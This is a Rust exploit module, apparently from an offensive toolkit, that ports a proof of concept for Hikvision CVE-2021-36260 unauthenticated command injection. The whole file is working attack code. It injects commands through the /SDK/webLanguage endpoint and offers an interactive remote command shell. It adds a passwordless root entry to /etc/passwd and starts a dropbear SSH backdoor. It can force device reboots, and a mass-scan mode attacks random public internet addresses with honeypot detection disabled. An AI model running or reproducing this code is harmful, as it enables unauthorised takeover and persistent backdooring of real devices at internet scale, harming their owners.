use anyhow::{anyhow, Context, Result};
use colored::*;
use rand::Rng;
use reqwest::Client;
use std::io::{self, Write};
use std::net::{IpAddr, Ipv4Addr};
use std::sync::Arc;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::time::Duration;
use tokio::sync::Semaphore;
use tokio::sync::mpsc;
use tokio::fs::OpenOptions;
use tokio::io::AsyncWriteExt;
use chrono::Local;

const DEFAULT_TIMEOUT_SECS: u64 = 10;
const MAX_CMD_LENGTH: usize = 22;
const MASS_SCAN_CONCURRENCY: usize = 100;
const MASS_SCAN_PORT: u16 = 80;

// Bogon/Private/Reserved exclusion ranges
const EXCLUDED_RANGES: &[&str] = &[
    "10.0.0.0/8", "127.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16",
    "224.0.0.0/4", "240.0.0.0/4", "0.0.0.0/8",
    "100.64.0.0/10", "169.254.0.0/16", "255.255.255.255/32",
    "103.21.244.0/22", "103.22.200.0/22", "103.31.4.0/22", "104.16.0.0/13",
    "104.24.0.0/14", "108.162.192.0/18", "131.0.72.0/22", "141.101.64.0/18",
    "162.158.0.0/15", "172.64.0.0/13", "173.245.48.0/20", "188.114.96.0/20",
    "190.93.240.0/20", "197.234.240.0/22", "198.41.128.0/17",
    "1.1.1.1/32", "1.0.0.1/32", "8.8.8.8/32", "8.8.4.4/32",
];

#[derive(Clone, Copy, Debug)]
enum ScanMode {
    SafeCheck,
    UnsafeReboot,
    CustomCommand,
}

fn generate_random_public_ip(exclusions: &[ipnetwork::IpNetwork]) -> IpAddr {
    let mut rng = rand::rng();
    loop {
        let octets: [u8; 4] = rng.random();
        let ip = Ipv4Addr::from(octets);
        let ip_addr = IpAddr::V4(ip);
        if !exclusions.iter().any(|net| net.contains(ip_addr)) {
            return ip_addr;
        }
    }
}

/// Display module banner
fn display_banner() {
    println!(
        "{}",
        "╔═══════════════════════════════════════════════════════════╗".cyan()
    );
    println!(
        "{}",
        "║   Hikvision Web Server CVE-2021-36260                     ║".cyan()
    );
    println!(
        "{}",
        "║   Unauthenticated Command Injection (Build 210702)        ║".cyan()
    );
    println!(
        "{}",
        "║   PoC by bashis - Ported to Rust for rustsploit           ║".cyan()
    );
    println!(
        "{}",
        "╚═══════════════════════════════════════════════════════════╝".cyan()
    );
}

/// Normalize target URL
fn normalize_target(raw: &str) -> String {
    let (scheme, after) = if let Some(s) = raw.strip_prefix("http://") {
        ("http://", s)
    } else if let Some(s) = raw.strip_prefix("https://") {
        ("https://", s)
    } else {
        ("http://", raw)
    };

    let (auth, path) = match after.find('/') {
        Some(i) => (&after[..i], &after[i..]),
        None => (after, ""),
    };

    let (host_part, port_part) = if auth.starts_with('[') {
        if let Some(pos) = auth.rfind(']') {
            (&auth[..=pos], &auth[pos + 1..])
        } else {
            (auth, "")
        }
    } else if auth.matches(':').count() > 1 {
        (auth, "") // IPv6 without brackets
    } else if let Some(pos) = auth.rfind(':') {
        (&auth[..pos], &auth[pos..])
    } else {
        (auth, "")
    };

    let mut inner = host_part;
    while inner.starts_with('[') && inner.ends_with(']') {
        inner = &inner[1..inner.len() - 1];
    }

    let wrapped = if inner.contains(':') {
        format!("[{}]", inner)
    } else {
        inner.to_string()
    };

    format!("{}{}{}{}", scheme, wrapped, port_part, path)
}

/// HTTP client wrapper for Hikvision exploitation
struct HikvisionClient {
    client: Client,
    base_url: String,
}

impl HikvisionClient {
    fn new(target: &str, proto: &str, timeout: u64) -> Result<Self> {
        let client = Client::builder()
            .danger_accept_invalid_certs(true)
            .timeout(Duration::from_secs(timeout))
            .build()
            .context("Failed to build HTTP client")?;

        let base_url = format!("{}://{}", proto, target);
        let base_url = normalize_target(&base_url);

        Ok(Self { client, base_url })
    }

    /// Send PUT request with command injection payload
    async fn send_payload(&self, command: &str, timeout: u64) -> Result<reqwest::Response> {
        if command.len() > MAX_CMD_LENGTH {
            return Err(anyhow!(
                "Command '{}' is too long ({} chars, max {})",
                command,
                command.len(),
                MAX_CMD_LENGTH
            ));
        }

        let payload = format!(
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?><language>$({})</language>",
            command
        );

        self.client
            .put(format!("{}/SDK/webLanguage", self.base_url))
            .header("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
            .header("X-Requested-With", "XMLHttpRequest")
            .body(payload)
            .timeout(Duration::from_secs(timeout))
            .send()
            .await
            .context("Failed to send payload")
    }

    /// Send GET request
    async fn get(&self, path: &str, timeout: u64) -> Result<reqwest::Response> {
        self.client
            .get(format!("{}{}", self.base_url, path))
            .timeout(Duration::from_secs(timeout))
            .send()
            .await
            .context("Failed to send GET request")
    }
}

async fn check_vulnerable(client: &HikvisionClient, noverify: bool) -> Result<bool> {
    if noverify {
        return Ok(true);
    }
    // First check if we can connect
    match client.get("/", 5).await {
        Ok(_) => {},
        Err(_) => return Ok(false),
    }

    // Try to write a test file
    match client.send_payload(">webLib/c", 5).await {
        Ok(resp) => {
            if resp.status().as_u16() == 404 { return Ok(false); }
            // Try to read the file we created
            match client.get("/c", 5).await {
                Ok(read_resp) => {
                    if read_resp.status().as_u16() == 200 { return Ok(true); }
                    Ok(false)
                }
                Err(_) => Ok(false),
            }
        }
        Err(_) => Ok(false),
    }
}

async fn check_with_reboot(client: &HikvisionClient) -> Result<bool> {
    let _ = client.send_payload("reboot", 5).await;
    tokio::time::sleep(Duration::from_secs(2)).await;
    match client.get("/", 5).await {
        Ok(_) => Ok(false), // Still responding
        Err(_) => Ok(true), // Device went down/rebooted
    }
}

async fn execute_cmd(client: &HikvisionClient, command: &str) -> Result<String> {
    let write_cmd = format!("{}>webLib/x", command);
    if write_cmd.len() > MAX_CMD_LENGTH {
        return Err(anyhow!("Command too long"));
    }
    client.send_payload(&write_cmd, 10).await?;
    let resp = client.get("/x", 10).await?;
    if resp.status().as_u16() != 200 {
        return Err(anyhow!("Failed to retrieve command output"));
    }
    match resp.text().await {
        Ok(text) => Ok(text),
        Err(e) => Err(anyhow!("Failed to read command output: {}", e)),
    }
}

async fn execute_blind_cmd(client: &HikvisionClient, command: &str) -> Result<()> {
    match client.send_payload(command, 10).await {
        Ok(resp) => {
             if resp.status().as_u16() == 500 { Ok(()) } else { Err(anyhow!("Unexpected code")) }
        }
        Err(e) => Err(anyhow!("Failed: {}", e)),
    }
}

async fn interactive_shell(client: &HikvisionClient) -> Result<()> {
    println!("{}", "[*] Preparing shell access...".cyan());
    match client.get("/N", 5).await {
        Ok(resp) => {
            if resp.status().as_u16() == 404 {
                client.send_payload("echo -n P::0:0:W>N", 10).await?;
                client.send_payload("echo :/:/bin/sh>>N", 10).await?;
                client.send_payload("cat N>>/etc/passwd", 10).await?;
                client.send_payload("dropbear -R -B -p 1337", 10).await?;
                client.send_payload("cat N>webLib/N", 10).await?;
                println!("{}", "[+] Dropbear SSH started on port 1337".green());
            }
        }
        Err(_) => return Err(anyhow!("Failed to check shell status")),
    }
    println!("{}", "[*] SSH connection ready".cyan());
    Ok(())
}

async fn interactive_mode(client: &HikvisionClient) -> Result<()> {
    println!("{}", "\n[*] Entering interactive command mode".cyan());
    loop {
        print!("{}", "hikvision> ".green().bold());
        io::stdout().flush()?;
        let mut input = String::new();
        io::stdin().read_line(&mut input)?;
        let cmd = input.trim();
        if cmd.is_empty() { continue; }
        if cmd == "exit" || cmd == "quit" { break; }
        match execute_cmd(client, cmd).await {
            Ok(output) => println!("{}", output),
            Err(e) => println!("{}", format!("[-] Error: {}", e).red()),
        }
    }
    Ok(())
}

/// Quick vulnerability check for mass scanning
async fn quick_check(ip: &str, mode: ScanMode, custom_payload: &str) -> bool {
    let host_port = format!("{}:{}", ip, MASS_SCAN_PORT);
    if let Ok(client) = HikvisionClient::new(&host_port, "http", 5) {
         match mode {
             ScanMode::SafeCheck => {
                 check_vulnerable(&client, false).await.unwrap_or(false)
             },
             ScanMode::UnsafeReboot => {
                 check_with_reboot(&client).await.unwrap_or(false)
             },
             ScanMode::CustomCommand => {
                  // Just execute validation blind command
                  match client.send_payload(custom_payload, 5).await {
                      Ok(resp) => resp.status().as_u16() == 200 || resp.status().as_u16() == 500,
                      Err(_) => false,
                  }
             }
         }
    } else {
        false
    }
}

/// Mass scan mode
async fn run_mass_scan() -> Result<()> {
    display_banner();
    println!("{}", "[*] Mass Scan Mode: 0.0.0.0/0".yellow().bold());
    println!("{}", "[*] Honeypot detection: DISABLED".yellow());
    println!("{}", format!("[*] Concurrency: {}", MASS_SCAN_CONCURRENCY).cyan());

    // Prompt for exclusions
    print!("{}", "[?] Exclude reserved/private ranges? [Y/n]: ".cyan());
    io::stdout().flush()?;
    let mut excl_choice = String::new();
    io::stdin().read_line(&mut excl_choice)?;
    let use_exclusions = !matches!(excl_choice.trim().to_lowercase().as_str(), "n" | "no");

    let mut exclusions = Vec::new();
    if use_exclusions {
        for cidr in EXCLUDED_RANGES {
            if let Ok(net) = cidr.parse::<ipnetwork::IpNetwork>() {
                exclusions.push(net);
            }
        }
    }
    let exclusions = Arc::new(exclusions);

    // Prompt for Output File
    print!("{}", "[?] Output File (default: hikvision_hits.txt): ".cyan());
    io::stdout().flush()?;
    let mut outfile = String::new();
    io::stdin().read_line(&mut outfile)?;
    let outfile = outfile.trim();
    let outfile = if outfile.is_empty() { "hikvision_hits.txt" } else { outfile };
    let outfile = outfile.to_string();

    // Prompt for Payload Mode
    println!("{}", "[?] Select Payload Mode:".cyan());
    println!("    1. Safe Check (File Write/Read)");
    println!("    2. Unsafe Check (Reboot Device)");
    println!("    3. Custom Command");
    print!("{}", "Select option [1-3] (default 1): ".cyan());
    io::stdout().flush()?;
    let mut mode_str = String::new();
    io::stdin().read_line(&mut mode_str)?;
    let mode = match mode_str.trim() {
        "2" => ScanMode::UnsafeReboot,
        "3" => ScanMode::CustomCommand,
        _ => ScanMode::SafeCheck,
    };

    let mut custom_payload = String::new();
    if let ScanMode::CustomCommand = mode {
        print!("{}", "[?] Enter Custom Command (max 22 chars): ".cyan());
        io::stdout().flush()?;
        io::stdin().read_line(&mut custom_payload)?;
        custom_payload = custom_payload.trim().to_string();
    }
    let custom_payload = Arc::new(custom_payload);
    
    let semaphore = Arc::new(Semaphore::new(MASS_SCAN_CONCURRENCY));
    let checked = Arc::new(AtomicUsize::new(0));
    let found = Arc::new(AtomicUsize::new(0));

    // Result writer channel
    let (tx, mut rx) = mpsc::unbounded_channel::<String>();
    
    // Writer task
    let outfile_clone = outfile.clone();
    tokio::spawn(async move {
        let mut file = OpenOptions::new()
            .create(true)
            .append(true)
            .open(&outfile_clone)
            .await
            .expect("Failed to open output file");
            
        while let Some(result) = rx.recv().await {
            if let Err(e) = file.write_all(result.as_bytes()).await {
                eprintln!("[-] Failed to write result: {}", e);
            }
        }
    });
    
    let c = checked.clone();
    let f = found.clone();
    tokio::spawn(async move {
        loop {
            tokio::time::sleep(Duration::from_secs(10)).await;
            println!("[*] Checked: {} | Found: {}", c.load(Ordering::Relaxed), f.load(Ordering::Relaxed));
        }
    });
    
    loop {
        let permit = semaphore.clone().acquire_owned().await.map_err(|e| anyhow::anyhow!("Semaphore closed: {}", e))?;
        let exc = exclusions.clone();
        let chk = checked.clone();
        let fnd = found.clone();
        let tx = tx.clone();
        let cp = custom_payload.clone();
        let current_mode = mode; // Copy
        
        tokio::spawn(async move {
            let ip = generate_random_public_ip(&exc);
            let ip_str = ip.to_string();
            
            if quick_check(&ip_str, current_mode, &cp).await {
                println!("{}", format!("[+] VULNERABLE: {}", ip_str).green().bold());
                fnd.fetch_add(1, Ordering::Relaxed);
                
                let timestamp = Local::now().format("%Y-%m-%d %H:%M:%S").to_string();
                let log_entry = format!("{} - {}\n", ip_str, timestamp);
                let _ = tx.send(log_entry);
            }
            
            chk.fetch_add(1, Ordering::Relaxed);
            drop(permit);
        });
    }
}

pub async fn run(target: &str) -> Result<()> {
    if target == "0.0.0.0" || target == "0.0.0.0/0" || target.is_empty() || target == "random" {
        run_mass_scan().await
    } else {
        display_banner();
        println!("{}", format!("[*] Target: {}", target).yellow());
        println!();

        // Parse target to extract host:port and protocol
        let (proto, host_port) = if target.starts_with("https://") {
            ("https", target.strip_prefix("https://").unwrap_or(target))
        } else if target.starts_with("http://") {
            ("http", target.strip_prefix("http://").unwrap_or(target))
        } else {
            ("http", target)
        };

        let host_port = host_port.split('/').next().unwrap_or(host_port);

        println!("{}", "[*] Select operation mode:".cyan());
        println!("  {} Check if vulnerable (safe)", "1.".bold());
        println!("  {} Check with reboot (unsafe)", "2.".bold());
        println!("  {} Execute single command", "3.".bold());
        println!("  {} Execute blind command", "4.".bold());
        println!("  {} Interactive shell mode", "5.".bold());
        println!("  {} Setup SSH shell (dropbear)", "6.".bold());
        println!();

        print!("{}", "Select option [1-6]: ".green());
        io::stdout().flush()?;

        let mut choice = String::new();
        io::stdin().read_line(&mut choice)?;
        let choice = choice.trim();

        let client = HikvisionClient::new(host_port, proto, DEFAULT_TIMEOUT_SECS)?;

        match choice {
            "1" => { check_vulnerable(&client, false).await?; }
            "2" => {
                println!();
                print!("{}", "[!] This will reboot the device. Continue? [y/N]: ".red());
                io::stdout().flush()?;
                let mut confirm = String::new();
                io::stdin().read_line(&mut confirm)?;
                if confirm.trim().eq_ignore_ascii_case("y") {
                    check_with_reboot(&client).await?;
                } else {
                    println!("{}", "[*] Aborted".yellow());
                }
            }
            "3" => {
                if !check_vulnerable(&client, false).await? { return Err(anyhow!("Target is not vulnerable")); }
                println!();
                print!("{}", "Enter command to execute: ".green());
                io::stdout().flush()?;
                let mut cmd = String::new();
                io::stdin().read_line(&mut cmd)?;
                let cmd = cmd.trim();
                if !cmd.is_empty() {
                    match execute_cmd(&client, cmd).await {
                        Ok(output) => {
                            println!("{}", "\n[+] Command output:".green());
                            println!("{}", output);
                        }
                        Err(e) => println!("{}", format!("[-] Error: {}", e).red()),
                    }
                }
            }
            "4" => {
                if !check_vulnerable(&client, false).await? { return Err(anyhow!("Target is not vulnerable")); }
                println!();
                print!("{}", "Enter blind command to execute: ".green());
                io::stdout().flush()?;
                let mut cmd = String::new();
                io::stdin().read_line(&mut cmd)?;
                let cmd = cmd.trim();
                if !cmd.is_empty() { execute_blind_cmd(&client, cmd).await?; }
            }
            "5" => {
                if !check_vulnerable(&client, false).await? { return Err(anyhow!("Target is not vulnerable")); }
                interactive_mode(&client).await?;
            }
            "6" => {
                if !check_vulnerable(&client, false).await? { return Err(anyhow!("Target is not vulnerable")); }
                interactive_shell(&client).await?;
            }
            _ => println!("{}", "[-] Invalid option".red()),
        }

        println!();
        println!("{}", "[*] Exploitation complete".cyan());
        Ok(())
    }
}
